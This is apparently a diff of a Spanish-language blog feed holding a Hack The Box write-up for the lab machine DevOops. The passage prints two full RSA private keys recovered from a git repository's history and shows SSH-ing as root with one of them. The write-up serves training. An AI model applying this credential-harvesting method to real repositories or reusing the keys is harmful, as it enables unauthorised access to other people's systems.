-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;resources/integration/authcredentials.key
-&lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
-MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
-ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
-23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
-sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
-ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
-ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
-LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
-JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
-oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
-xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
-vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
-6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
-OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
-4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
-937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
-SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
-Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
-eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
-i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
-6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
-8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
-RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
-qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
-T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
-bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
-roosa@gitter:~/work/blogfeed&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;El archivo aloja una &lt;strong&gt;id_rsa&lt;/strong&gt;, pero no sabemos de quien, asi que analizando un poco los resultados obtenidos del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git log --name-only --oneline&lt;/code&gt;, vemos que el usuario agregó una llave (&lt;em&gt;key&lt;/em&gt;) y posteriormente lo revirtió, posiblemente porque se equivocó (&lt;strong&gt;Nota&lt;/strong&gt;: La secuencia de lee de abajo hacia arriba, es decir, los cambios más recientes se encuetran hasta arriba).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;33e87c3 reverted accidental commit with proper key
-resources/integration/authcredentials.key
-d387abf add key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;feed integration from tnerprise backend
-resources/integration/authcredentials.key
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para ver la clave que se cambió, podemos aplicar un diferencial entre el id &lt;strong&gt;d387abf&lt;/strong&gt; (asociado a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add key for feed integration from tnerprise backend&lt;/code&gt;) y el id &lt;strong&gt;1422e5a&lt;/strong&gt; (asociado a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Initial commit&lt;/code&gt;).&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git diff d387abf 1422e5a
-diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
-deleted file mode 100644
-index 44c981f..0000000
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/resources/integration/authcredentials.key
-+++ /dev/null
-@@ &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;,28 +0,0 @@
-&lt;span class=&quot;nt&quot;&gt;------BEGIN&lt;/span&gt; RSA PRIVATE KEY-----
-&lt;span class=&quot;nt&quot;&gt;-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU&lt;/span&gt;/WFI+OPQcpOVj9DdSIEde
-&lt;span class=&quot;nt&quot;&gt;-8PDgpt&lt;/span&gt;/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
-&lt;span class=&quot;nt&quot;&gt;-vr&lt;/span&gt;+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
-&lt;span class=&quot;nt&quot;&gt;-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt&lt;/span&gt;/rEgIVmrb+
-&lt;span class=&quot;nt&quot;&gt;-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc&lt;/span&gt;/SHSE0c
-&lt;span class=&quot;nt&quot;&gt;-F9DmYwbVqRcurk3yAS&lt;/span&gt;+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
-&lt;span class=&quot;nt&quot;&gt;-uzjPbIdyEkDc3PAYP&lt;/span&gt;+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
-&lt;span class=&quot;nt&quot;&gt;-gCfN5I&lt;/span&gt;+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
-&lt;span class=&quot;nt&quot;&gt;-k2X0256DbRv&lt;/span&gt;/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
-&lt;span class=&quot;nt&quot;&gt;-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-HSRik2J&lt;/span&gt;/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
-&lt;span class=&quot;nt&quot;&gt;-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK&lt;/span&gt;/oLc0RB
-&lt;span class=&quot;nt&quot;&gt;-GLEKU6HtUuKFvlXdJ22S4&lt;/span&gt;/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
-&lt;span class=&quot;nt&quot;&gt;-jwrjv&lt;/span&gt;/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
-&lt;span class=&quot;nt&quot;&gt;-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO&lt;/span&gt;+R3+MqL7lvAhHjWKMw
--+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
-&lt;span class=&quot;nt&quot;&gt;-7vSqlsZnT9jR2syvuhhVz4Ei9yA&lt;/span&gt;/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
-&lt;span class=&quot;nt&quot;&gt;-Gx&lt;/span&gt;+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
-&lt;span class=&quot;nt&quot;&gt;-iD6fE&lt;/span&gt;+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
-&lt;span class=&quot;nt&quot;&gt;-VRFHfKaKuof&lt;/span&gt;+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
-&lt;span class=&quot;nt&quot;&gt;-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV&lt;/span&gt;+5SwWkec6
-&lt;span class=&quot;nt&quot;&gt;-md&lt;/span&gt;/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
-&lt;span class=&quot;nt&quot;&gt;-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-oAvexd1JRMkbC7YOgrzZ9iOxHP&lt;/span&gt;+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
-&lt;span class=&quot;nt&quot;&gt;-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;------END&lt;/span&gt; RSA PRIVATE KEY-----
--
-roosa@gitter:~/work/blogfeed&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Tambien podríamos comparar el id &lt;strong&gt;d387abf&lt;/strong&gt; contra &lt;strong&gt;33e87c3&lt;/strong&gt; (asociado a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverted accidental commit with proper key&lt;/code&gt;), pero veríamos las dos claves.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;roosa@gitter:~/work/blogfeed&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git diff 33e87c3 d387abf                                                                           
-diff &lt;span class=&quot;nt&quot;&gt;--git&lt;/span&gt; a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key                               
-index f4bde49..44c981f 100644
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/resources/integration/authcredentials.key
-+++ b/resources/integration/authcredentials.key
-@@ &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;,27 +1,28 @@
- &lt;span class=&quot;nt&quot;&gt;-----BEGIN&lt;/span&gt; RSA PRIVATE KEY----- 
-&lt;span class=&quot;nt&quot;&gt;-MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx&lt;/span&gt;/cvxPZX0XunSLD8veN
-&lt;span class=&quot;nt&quot;&gt;-ouroJLw0Qtfh&lt;/span&gt;+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
-&lt;span class=&quot;nt&quot;&gt;-23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8&lt;/span&gt;+fssjW5sSxze74d7Ez3uOI9zPE
-&lt;span class=&quot;nt&quot;&gt;-sQ26ynmLutnd&lt;/span&gt;/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
-&lt;span class=&quot;nt&quot;&gt;-ukQs4gdHPeSj7kDpgHkRyCt&lt;/span&gt;+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
-&lt;span class=&quot;nt&quot;&gt;-ZBlx4UG0bdxtoE8DLjfoJuWGfCF&lt;/span&gt;/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
-&lt;span class=&quot;nt&quot;&gt;-LZ&lt;/span&gt;++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
-&lt;span class=&quot;nt&quot;&gt;-JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms&lt;/span&gt;/2KppubiHDi9
-&lt;span class=&quot;nt&quot;&gt;-oKL7XLUpSnSrWQyMGQx&lt;/span&gt;/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
-&lt;span class=&quot;nt&quot;&gt;-xL8NWx4knCZEC&lt;/span&gt;+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
-&lt;span class=&quot;nt&quot;&gt;-vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa&lt;/span&gt;+b/U3I9We1P+0nbfjYX8x
-&lt;span class=&quot;nt&quot;&gt;-6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV&lt;/span&gt;+CLBldcmrvUxRTIa8o4e+
-&lt;span class=&quot;nt&quot;&gt;-OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv&lt;/span&gt;+6pfyh3H5SuLhu9PPA36MjRyE
-&lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt;+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
-&lt;span class=&quot;nt&quot;&gt;-937GI&lt;/span&gt;+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
-&lt;span class=&quot;nt&quot;&gt;-SQMoKu&lt;/span&gt;++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
-&lt;span class=&quot;nt&quot;&gt;-Nszh8L9BDEc&lt;/span&gt;/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
-&lt;span class=&quot;nt&quot;&gt;-eGDe3y&lt;/span&gt;/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
-&lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
-&lt;span class=&quot;nt&quot;&gt;-6TIQBw&lt;/span&gt;+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
-&lt;span class=&quot;nt&quot;&gt;-8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe&lt;/span&gt;+03W8ejrla7Y8ZNsWWnsCWYgV
-&lt;span class=&quot;nt&quot;&gt;-RoGCzgjW3Cc6fX8PXO&lt;/span&gt;+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
-&lt;span class=&quot;nt&quot;&gt;-qML&lt;/span&gt;/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
-&lt;span class=&quot;nt&quot;&gt;-T3Sd&lt;/span&gt;/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
-&lt;span class=&quot;nt&quot;&gt;-bU34EzQLp7oRU&lt;/span&gt;/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
-+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
-+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
-+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
-+nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
-+CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
-+F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
-+uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
-+gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
-+k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
-+NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
-+HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
-+2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
-+GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
-+jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
-+IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
-++XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
-+7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
-+Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
-+iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
-+VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
-+S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
-+md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
-+LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
-+oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
-+LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
- &lt;span class=&quot;nt&quot;&gt;-----END&lt;/span&gt; RSA PRIVATE KEY-----
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos copiamos la &lt;strong&gt;id_rsa&lt;/strong&gt; identificada, le damos el permiso 600 y procedemos a conectarnos a través del puerto 22 como el usuario &lt;strong&gt;root&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; id_rsa root@10.10.10.91
-Welcome to Ubuntu 16.04.4 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 4.13.0-37-generic i686&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
- &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage
-
-135 packages can be updated.
-60 updates are security updates.
-
-Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
-root@gitter:~# &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-root@gitter:~#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somos &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="XXE" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina DevOops en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;A partir de este punto ya podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="PHP" /><category term="Log_Poisoning" /><category term="Powershell" /><summary type="html">Resolución de la máquina Bart en la plataforma de Hack The Box</summary></entry></feed>
